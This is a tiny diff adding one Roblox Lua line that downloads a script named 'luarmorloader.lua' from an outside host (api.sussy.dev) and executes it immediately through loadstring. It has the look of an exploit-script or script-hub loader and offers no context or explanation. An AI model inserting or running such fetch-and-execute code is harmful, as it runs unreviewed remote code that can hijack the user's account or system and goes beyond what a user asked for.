@@ -1,0 +1,2 @@
+
+loadstring(game:HttpGet("https://api.sussy.dev/v1/KeySystem/Assets/GetPublicFile?fileName=luarmorloader.lua"))()
